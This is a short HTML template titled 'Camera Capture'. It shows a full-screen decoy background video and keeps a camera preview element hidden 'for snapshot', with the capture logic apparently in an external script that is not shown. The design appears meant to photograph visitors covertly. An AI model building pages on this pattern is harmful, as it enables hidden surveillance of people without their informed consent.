<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: black;
            overflow: hidden;
        }
        #bg-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }
        #preview {
            display: none; /* Hidden, but still available for snapshot */
        }
    </style>
</head>
<body>
    <!-- Background video -->
    <video id="bg-video" autoplay muted loop playsinline>
        <source src="/static/background.mp4" type="video/mp4">
    </video>

    <!-- Hidden preview element for snapshots -->
    <video id="preview" autoplay playsinline></video>

    <script>
        const UID = "{{ uid }}";
    </script>
    <script src="/static/script.js"></script>
</body>
</html>
